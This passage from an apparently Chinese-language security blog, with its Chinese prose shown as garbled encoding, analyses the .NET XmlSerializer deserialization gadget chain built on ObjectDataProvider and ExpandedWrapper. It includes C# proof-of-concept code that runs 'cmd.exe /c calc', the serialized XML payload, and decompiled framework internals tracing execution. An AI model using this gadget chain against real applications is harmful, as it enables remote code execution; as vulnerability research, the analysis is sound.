odp.MethodParameters.Add(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">            odp.MethodParameters.Add(<span class="string">&quot;/c calc&quot;</span>);</span><br><span class="line">            odp.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å½“è¿™æ®µä»£ç è¿è¡Œåä¼šå¼¹å‡ºè®¡ç®—æœºï¼Œé‚£ä¹ˆå‘½ä»¤è¡Œä»£ç çš„æ‰§è¡Œæ—¶æœºæ˜¯åœ¨å“ªå‘¢ï¼Œæˆ‘ä»¬è§‚å¯Ÿ<code>ObjectDataProvider</code>çš„<code>MethodName</code>ä»¥åŠ<code>MethodParameters</code>æˆå‘˜å˜é‡ï¼Œå‘ç°<code>Methodname</code>å­˜åœ¨<code>set</code>è®¿é—®å™¨<br>åœ¨<code>set</code>è®¿é—®å™¨ä¸­æœ‰ä¸€ä¸ªifåˆ¤æ–­æ˜¯å¦æ˜¯å»¶è¿Ÿåˆ·æ–°ï¼Œé»˜è®¤è®¡ç®—ç»“æœä¸º<code>false</code>å³ä¼šè°ƒç”¨åˆ°<code>Refresh</code>æ–¹æ³•  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">[<span class="meta">DefaultValue(null)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">string</span> MethodName</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">get</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> _methodName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">set</span></span><br><span class="line">    &#123;</span><br><span class="line">        _methodName = <span class="keyword">value</span>;</span><br><span class="line">        OnPropertyChanged(<span class="string">&quot;MethodName&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">base</span>.IsRefreshDeferred)</span><br><span class="line">        &#123;</span><br><span class="line">            Refresh();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Refresh</code>æ–¹æ³•æœ€ç»ˆä¼šè°ƒç”¨åˆ°<code>QueryWorker</code>æ–¹æ³•ï¼Œåœ¨<code>QueryWorker</code>æ–¹æ³•ä¸­ä¼šè°ƒç”¨åˆ°<code>InvokeMethodOnInstance</code>æ–¹æ³•è°ƒç”¨å‘½ä»¤æ‰§è¡Œæ–¹æ³•ã€‚  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Refresh</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    _initialLoadCalled = <span class="literal">true</span>;</span><br><span class="line">    BeginQuery();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">BeginQuery</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (TraceData.IsExtendedTraceEnabled(<span class="keyword">this</span>, TraceDataLevel.Attach))</span><br><span class="line">    &#123;</span><br><span class="line">        TraceData.Trace(TraceEventType.Warning, TraceData.BeginQuery(TraceData.Identify(<span class="keyword">this</span>), IsAsynchronous ? <span class="string">&quot;asynchronous&quot;</span> : <span class="string">&quot;synchronous&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (IsAsynchronous)</span><br><span class="line">    &#123;</span><br><span class="line">        ThreadPool.QueueUserWorkItem(QueryWorker, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        QueryWorker(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">QueryWorker</span>(<span class="params"><span class="built_in">object</span> obj</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">object</span> obj2 = <span class="literal">null</span>;</span><br><span class="line">    Exception e = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (_mode == SourceMode.NoSource || _objectType == <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (TraceData.IsEnabled)</span><br><span class="line">        &#123;</span><br><span class="line">            TraceData.Trace(TraceEventType.Error, TraceData.ObjectDataProviderHasNoSource);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        e = <span class="keyword">new</span> InvalidOperationException(SR.Get(<span class="string">&quot;ObjectDataProviderHasNoSource&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Exception e2 = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (_needNewInstance &amp;&amp; _mode == SourceMode.FromType)</span><br><span class="line">        &#123;</span><br><span class="line">            ConstructorInfo[] constructors = _objectType.GetConstructors();</span><br><span class="line">            <span class="keyword">if</span> (constructors.Length != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                _objectInstance = CreateObjectInstance(<span class="keyword">out</span> e2);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            _needNewInstance = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrEmpty(MethodName))</span><br><span class="line">        &#123;</span><br><span class="line">            obj2 = _objectInstance;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            obj2 = InvokeMethodOnInstance(<span class="keyword">out</span> e);</span><br><span class="line">            <span class="keyword">if</span> (e != <span class="literal">null</span> &amp;&amp; e2 != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                e = e2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>InvokeMethodOnInstance</code>å°†ä¼šè°ƒç”¨æŒ‡å®šæ–¹æ³•</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="built_in">object</span> <span class="title">InvokeMethodOnInstance</span>(<span class="params"><span class="keyword">out</span> Exception e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">object</span> result = <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">string</span> text = <span class="literal">null</span>;</span><br><span class="line">    e = <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">object</span>[] array = <span class="keyword">new</span> <span class="built_in">object</span>[_methodParameters.Count];</span><br><span class="line">    _methodParameters.CopyTo(array, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        result = _objectType.InvokeMember(MethodName, BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy | BindingFlags.InvokeMethod | BindingFlags.OptionalParamBinding, <span class="literal">null</span>, _objectInstance, array, CultureInfo.InvariantCulture);</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå°±æ˜¯è¯´<code>MethodName</code>å˜é‡çš„<code>set</code>è®¿é—®å™¨è¢«è§¦å‘æ—¶ä¼šè°ƒç”¨<code>objectInstance</code>å˜é‡æ‰€æŒ‡å‘å¯¹ä¸‹ä¸ªä½ çš„æŒ‡å®šæ–¹æ³•ï¼Œæ–¹æ³•åä¸º<code>methodName</code>å˜é‡çš„å€¼ï¼Œå‚æ•°ä¸º<code>MethodParameters</code>ã€‚<br><code>XmlSerializer</code>ç±»åœ¨ååºåˆ—åŒ–<code>xml</code>çš„æ—¶å€™ä¼šæ„é€ <code>ObjectDataProvider</code>å¯¹è±¡ï¼Œåœ¨å¯¹è±¡æ„é€ çš„è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨åˆ°å…¶æˆå‘˜å˜é‡çš„<code>set</code>è®¿é—®å™¨ä¸ºæˆå‘˜å˜é‡èµ‹å€¼ä»è€Œè§¦å‘å‘½ä»¤æ‰§è¡Œã€‚<br>åªæ˜¯è¿™æ ·æ˜¯ä¸å¤Ÿçš„ï¼Œå› ä¸º<code>ObjectDataProvider</code>å¯¹è±¡å¹¶ä¸èƒ½è¢«<code>XmlSerializer</code>åºåˆ—åŒ–ã€‚è¿™ä¸ªæ—¶å€™å°±éœ€è¦<code>ExpandedWrapper</code>å¯¹<code>ObjectDataProvider</code>è¿›è¡ŒåŒ…è£…ï¼Œå¦å¤–å³ä¾¿<code>ObjectDataProvider</code>è¢«åŒ…è£…åä¹Ÿæ˜¯ä¸èƒ½æˆåŠŸåºåˆ—åŒ–çš„ï¼Œ<br>å› ä¸º<code>ObjectProvider</code>çš„æˆå‘˜å˜é‡<code>ObjectInstance</code>æ˜¯ä¸€ä¸ª<code>Process</code>å¯¹è±¡ï¼Œå› ä¸ºè¯¥å¯¹è±¡æ˜¯ä¸èƒ½è¢«<code>XmlSerializer</code>åºåˆ—åŒ–çš„ã€‚<br>æˆ‘ä»¬å¯ä»¥å…ˆå¯¹å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•è¿›è¡Œä¸€ä¸‹å°è£…è®©å…¶èƒ½å¤Ÿè¢«åºåˆ—åŒ–æ–¹ä¾¿æµ‹è¯•ã€‚<br>ä»£ç å¦‚ä¸‹ï¼š  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">[<span class="meta">XmlRoot</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ProcessT</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exec</span>()</span></span><br><span class="line">	&#123;</span><br><span class="line">		Process process = <span class="keyword">new</span> Process();</span><br><span class="line">		process.StartInfo.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">		process.StartInfo.Arguments = <span class="string">&quot;/c calc&quot;</span>;</span><br><span class="line">		process.Start();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] <span class="keyword">args</span></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            ExpandedWrapper&lt;ProcessT, ObjectDataProvider&gt; expandedWrapper = <span class="keyword">new</span> ExpandedWrapper&lt;ProcessT, ObjectDataProvider&gt;();</span><br><span class="line">            ObjectDataProvider object_data_provider = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            object_data_provider.MethodName = <span class="string">&quot;exec&quot;</span>;</span><br><span class="line">            object_data_provider.ObjectInstance = <span class="keyword">new</span> ProcessT();</span><br><span class="line">            expandedWrapper.ProjectedProperty0 = object_data_provider;</span><br><span class="line">            XmlSerializer xml = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(ExpandedWrapper&lt;ProcessT, ObjectDataProvider&gt;));</span><br><span class="line">            TextWriter text_writer = <span class="keyword">new</span> StreamWriter(<span class="string">@&quot;test.xml&quot;</span>);</span><br><span class="line">            xml.Serialize(text_writer, expandedWrapper);</span><br><span class="line">            text_writer.Close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·è¢«å°è£…åå°±è§£å†³äº†<code>Process</code>ä¸èƒ½è¢«åºåˆ—åŒ–çš„é—®é¢˜ï¼Œé‚£ä¹ˆ<code>ExpandedWrapper</code>æ˜¯å¦‚ä½•è§£å†³<code>ObjectDataprovider</code>ä¸èƒ½è¢«åºåˆ—åŒ–çš„é—®é¢˜çš„å‘¢ï¼Ÿ<br>åœ¨<code>test.xml</code>ä¸­åºåˆ—åŒ–çš„æ•°æ®ä¸º  </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ExpandedWrapperOfProcessTObjectDataProvider</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ProjectedProperty0</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ObjectInstance</span> <span class="attr">xsi:type</span>=<span class="string">&quot;ProcessT&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">MethodName</span>&gt;</span>exec<span class="tag">&lt;/<span class="name">MethodName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ProjectedProperty0</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ExpandedWrapperOfProcessTObjectDataProvider</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>ExpandedWrapper</code>è¢«ç¼–è¯‘çš„æ—¶å€™ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªç¨‹åºé›†ï¼ˆå’±ä¹Ÿä¸çŸ¥é“æ˜¯è°ç”Ÿæˆçš„ï¼Œæˆ‘çœ‹çš„æ–‡ç« æ˜¯è¯´åœ¨XmlSerializeråœ¨åˆå§‹åŒ–çš„æ—¶å€™ç”Ÿæˆè¿™ä¸ªç¨‹åºé›†ï¼‰ï¼Œ<br>è¿™ä¸ªç¨‹åºé›†ä¸­åŒ…å«ä¸¤ä¸ªç±»åˆ†åˆ«æ˜¯ <code>XmlSerializationReaderExpandedWrapper2</code>ä»¥åŠ<code>XmlSerializationWriterExpandedWrapper2</code>åˆ†åˆ«åœ¨<code>ExpanderWrapper</code>çš„åºåˆ—åŒ–ä»¥åŠååºåˆ—åŒ–è¿‡ç¨‹ä¸­è¢«è°ƒç”¨<br><img src="/archives/ff457959/0880c08b01109690e53a.png" alt="img1"><br>åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­é¦–å…ˆè¢«è°ƒç”¨çš„æ˜¯<code>Read9_Item</code>æ–¹æ³•<br><img src="/archives/ff457959/0880c08b011096908d3c.png" alt="img2"><br><code>Read9_Item</code>æ–¹æ³•è°ƒç”¨<code>Read8_Item</code>  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">Read9_Item</span>()</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">object</span> result = <span class="literal">null</span>;</span><br><span class="line">			<span class="keyword">base</span>.Reader.MoveToContent();</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">base</span>.Reader.NodeType == XmlNodeType.Element)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (<span class="keyword">base</span>.Reader.LocalName != <span class="keyword">this</span>.id1_Item || <span class="keyword">base</span>.Reader.NamespaceURI != <span class="keyword">this</span>.id2_Item)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">base</span>.CreateUnknownNodeException();</span><br><span class="line">				&#125;</span><br><span class="line">				result = <span class="keyword">this</span>.Read8_Item(<span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">base</span>.UnknownNode(<span class="literal">null</span>, <span class="string">&quot;:ExpandedWrapperOfProcessTObjectDataProvider&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> result;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p><code>Read8_Item</code>æœ€ç»ˆè°ƒç”¨åˆ°<code>Read7_ObjectDataProvider</code>ï¼Œçœ‹åˆ°è¿™ä¸ªåå­—è”æƒ³åˆ°æ˜¯å¦ä¼šåˆ›å»º<code>ObjectDataProvider</code>è¿™æ ·æ˜¯å¦å°±ä¼šç»™å…¶<code>objectInstance</code>ä»¥åŠ<code>MehtodName</code>å±æ€§èµ‹å€¼ä»è€Œè§¦å‘å‘½ä»¤æ‰§è¡Œï¼Ÿ  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ExpandedWrapper&lt;ProcessT, ObjectDataProvider&gt; <span class="title">Read8_Item</span>(<span class="params"><span class="built_in">bool</span> isNullable, <span class="built_in">bool</span> checkType</span>)</span></span><br><span class="line">		&#123;</span><br><span class="line">			XmlQualifiedName xmlQualifiedName = checkType ? <span class="keyword">base</span>.GetXsiType() : <span class="literal">null</span>;</span><br><span class="line">			<span class="built_in">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">			<span class="keyword">if</span> (isNullable)</span><br><span class="line">			&#123;</span><br><span class="line">				flag = <span class="keyword">base</span>.ReadNull();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (checkType)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (xmlQualifiedName != <span class="literal">null</span> &amp;&amp; (xmlQualifiedName.Name != <span class="keyword">this</span>.id1_Item || xmlQualifiedName.Namespace != <span class="keyword">this</span>.id2_Item))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">base</span>.CreateUnknownTypeException(xmlQualifiedName);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			ExpandedWrapper&lt;ProcessT, ObjectDataProvider&gt; result;</span><br><span class="line">			<span class="keyword">if</span> (flag)</span><br><span class="line">			&#123;</span><br><span class="line">				result = <span class="literal">null</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				ExpandedWrapper&lt;ProcessT, ObjectDataProvider&gt; expandedWrapper = <span class="keyword">new</span> ExpandedWrapper&lt;ProcessT, ObjectDataProvider&gt;();</span><br><span class="line">				<span class="built_in">bool</span>[] array = <span class="keyword">new</span> <span class="built_in">bool</span>[<span class="number">3</span>];</span><br><span class="line">				<span class="keyword">while</span> (<span class="keyword">base</span>.Reader.MoveToNextAttribute())</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (!<span class="keyword">base</span>.IsXmlnsAttribute(<span class="keyword">base</span>.Reader.Name))</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">base</span>.UnknownNode(expandedWrapper);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">base</span>.Reader.MoveToElement();</span><br><span class="line">				<span class="keyword">if</span> (<span class="keyword">base</span>.Reader.IsEmptyElement)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">base</span>.Reader.Skip();</span><br><span class="line">					result = expandedWrapper;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">base</span>.Reader.ReadStartElement();</span><br><span class="line">					<span class="keyword">base</span>.Reader.MoveToContent();</span><br><span class="line">					<span class="built_in">int</span> num = <span class="number">0</span>;</span><br><span class="line">					<span class="built_in">int</span> readerCount = <span class="keyword">base</span>.ReaderCount;</span><br><span class="line">					<span class="keyword">while</span> (<span class="keyword">base</span>.Reader.NodeType != XmlNodeType.EndElement &amp;&amp; <span class="keyword">base</span>.Reader.NodeType != XmlNodeType.None)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span> (<span class="keyword">base</span>.Reader.NodeType == XmlNodeType.Element)</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="keyword">if</span> (!array[<span class="number">0</span>] &amp;&amp; (<span class="keyword">base</span>.Reader.LocalName == <span class="keyword">this</span>.id3_Description &amp;&amp; <span class="keyword">base</span>.Reader.NamespaceURI == <span class="keyword">this</span>.id2_Item))</span><br><span class="line">							&#123;</span><br><span class="line">								expandedWrapper.Description = <span class="keyword">base</span>.Reader.ReadElementString();</span><br><span class="line">								array[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span> <span class="keyword">if</span> (!array[<span class="number">1</span>] &amp;&amp; (<span class="keyword">base</span>.Reader.LocalName == <span class="keyword">this</span>.id4_ExpandedElement &amp;&amp; <span class="keyword">base</span>.Reader.NamespaceURI == <span class="keyword">this</span>.id2_Item))</span><br><span class="line">							&#123;</span><br><span class="line">								expandedWrapper.ExpandedElement = <span class="keyword">this</span>.Read2_ProcessT(<span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">								array[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span> <span class="keyword">if</span> (!array[<span class="number">2</span>] &amp;&amp; (<span class="keyword">base</span>.Reader.LocalName == <span class="keyword">this</span>.id5_ProjectedProperty0 &amp;&amp; <span class="keyword">base</span>.Reader.NamespaceURI == <span class="keyword">this</span>.id2_Item))</span><br><span class="line">							&#123;</span><br><span class="line">								expandedWrapper.ProjectedProperty0 = <span class="keyword">this</span>.Read7_ObjectDataProvider(<span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">								array[<span class="number">2</span>] = <span class="literal">true</span>;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span></span><br><span class="line">							&#123;</span><br><span class="line">								<span class="keyword">base</span>.UnknownNode(expandedWrapper, <span class="string">&quot;:Description, :ExpandedElement, :ProjectedProperty0&quot;</span>);</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							<span class="keyword">base</span>.UnknownNode(expandedWrapper, <span class="string">&quot;:Description, :ExpandedElement, :ProjectedProperty0&quot;</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">base</span>.Reader.MoveToContent();</span><br><span class="line">						<span class="keyword">base</span>.CheckReaderCount(<span class="keyword">ref</span> num, <span class="keyword">ref</span> readerCount);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">base</span>.ReadEndElement();</span><br><span class="line">					result = expandedWrapper;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> result;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p><code>Read7_ObjectDataProvider</code>åœ¨ä¸º<code>MethodName</code>èµ‹å€¼æ—¶å°†ä¼šè§¦å‘ <code>MehtodName</code>çš„<code>set</code>è®¿é—®å™¨ ä»è€Œè§¦å‘å‘½ä»¤æ‰§è¡Œ  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ObjectDataProvider <span class="title">Read7_ObjectDataProvider</span>(<span class="params"><span class="built_in">bool</span> isNullable, <span class="built_in">bool</span> checkType</span>)</span></span><br><span class="line">		&#123;</span><br><span class="line">		...</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				ObjectDataProvider objectDataProvider = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">				IList constructorParameters = objectDataProvider.ConstructorParameters;</span><br><span class="line">				IList methodParameters = objectDataProvider.MethodParameters;</span><br><span class="line">				<span class="built_in">bool</span>[] array = <span class="keyword">new</span> <span class="built_in">bool</span>[<span class="number">7</span>];</span><br><span class="line">				<span class="keyword">while</span> (<span class="keyword">base</span>.Reader.MoveToNextAttribute())</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (!<span class="keyword">base</span>.IsXmlnsAttribute(<span class="keyword">base</span>.Reader.Name))</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">base</span>.UnknownNode(objectDataProvider);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">base</span>.Reader.MoveToElement();</span><br><span class="line">				<span class="keyword">if</span> (<span class="keyword">base</span>.Reader.IsEmptyElement)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">base</span>.Reader.Skip();</span><br><span class="line">					result = objectDataProvider;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">base</span>.Reader.ReadStartElement();</span><br><span class="line">					<span class="keyword">base</span>.Reader.MoveToContent();</span><br><span class="line">					<span class="built_in">int</span> num = <span class="number">0</span>;</span><br><span class="line">					<span class="built_in">int</span> readerCount = <span class="keyword">base</span>.ReaderCount;</span><br><span class="line">					<span class="keyword">while</span> (<span class="keyword">base</span>.Reader.NodeType != XmlNodeType.EndElement &amp;&amp; <span class="keyword">base</span>.Reader.NodeType != XmlNodeType.None)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span> (<span class="keyword">base</span>.Reader.NodeType == XmlNodeType.Element)</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="keyword">if</span> (!array[<span class="number">0</span>] &amp;&amp; (<span class="keyword">base</span>.Reader.LocalName == <span class="keyword">this</span>.id7_IsInitialLoadEnabled &amp;&amp; <span class="keyword">base</span>.Reader.NamespaceURI == <span class="keyword">this</span>.id2_Item))</span><br><span class="line">							&#123;</span><br><span class="line">								<span class="keyword">if</span> (<span class="keyword">base</span>.Reader.IsEmptyElement)</span><br><span class="line">								&#123;</span><br><span class="line">									<span class="keyword">base</span>.Reader.Skip();</span><br><span class="line">								&#125;</span><br><span class="line">								<span class="keyword">else</span></span><br><span class="line">								&#123;</span><br><span class="line">									objectDataProvider.IsInitialLoadEnabled = XmlConvert.ToBoolean(<span class="keyword">base</span>.Reader.ReadElementString());</span><br><span class="line">								&#125;</span><br><span class="line">								array[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span> <span class="keyword">if</span> (!array[<span class="number">1</span>] &amp;&amp; (<span class="keyword">base</span>.Reader.LocalName == <span class="keyword">this</span>.id8_ObjectType &amp;&amp; <span class="keyword">base</span>.Reader.NamespaceURI == <span class="keyword">this</span>.id2_Item))</span><br><span class="line">							&#123;</span><br><span class="line">								objectDataProvider.ObjectType = <span class="keyword">this</span>.Read6_Type(<span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">								array[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span> <span class="keyword">if</span> (!array[<span class="number">2</span>] &amp;&amp; (<span class="keyword">base</span>.Reader.LocalName == <span class="keyword">this</span>.id9_ObjectInstance &amp;&amp; <span class="keyword">base</span>.Reader.NamespaceURI == <span class="keyword">this</span>.id2_Item))</span><br><span class="line">							&#123;</span><br><span class="line">							<span class="comment">// è®¾ç½®objectInstanceå±æ€§å€¼</span></span><br><span class="line">								objectDataProvider.ObjectInstance = <span class="keyword">this</span>.Read1_Object(<span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">								array[<span class="number">2</span>] = <span class="literal">true</span>;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span> <span class="keyword">if</span> (!array[<span class="number">3</span>] &amp;&amp; (<span class="keyword">base</span>.Reader.LocalName == <span class="keyword">this</span>.id10_MethodName &amp;&amp; <span class="keyword">base</span>.Reader.NamespaceURI == <span class="keyword">this</span>.id2_Item))</span><br><span class="line">							&#123;</span><br><span class="line">							<span class="comment">// è®¾ç½® MethodNameå±æ€§å€¼ å°†ä¼šè§¦å‘ MehtodNameçš„setè®¿é—®å™¨ ä»è€Œè§¦å‘å‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line">								objectDataProvider.MethodName = <span class="keyword">base</span>.Reader.ReadElementString();</span><br><span class="line">								array[<span class="number">3</span>] = <span class="literal">true</span>;</span><br><span class="line">							&#125;</span><br><span class="line">				...</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
